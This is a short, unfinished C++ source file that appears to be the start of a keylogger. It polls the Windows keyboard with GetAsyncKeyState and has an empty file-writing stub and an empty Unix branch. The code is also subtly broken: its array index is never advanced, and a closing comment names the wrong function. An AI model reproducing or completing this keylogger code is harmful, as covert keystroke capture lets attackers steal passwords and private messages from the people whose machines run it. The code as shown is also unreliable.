#include <iostream>
#include <fstream>
#include "keylog.h"
#if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
#include <winduser.h>
#elif __unix__ 
#include <sys/types.h>
#include <fcntl.h>
#include <termios.h>
#include <unistd.h>
#endif // macros defined by cpp (C prprocessor)

using namespace std;

vector<key> getPressedKeyboardState() {
    vector<key> pressed;
    static bool ar[94];
    #if defined(_WIN32) || defined(__CYGWIN__) || defined(__CYGWIN32)
    int x = 0;
    for (vcodes v = vcodes::VK_BACK; v != vcodes::END; ++v) {
        bool p = (GetAsyncKeyState(v) & 0x8000);
        if (p && !ar[x]) {
            ar[x] = true;
            pressed.push_back(v);
        } else if (!p) {
            ar[x] = false;
        }
    }
    #elif __unix__
    #endif
    return pressed;
} // getAsyncKeyboardState

void writeToFile(char c) {
    
}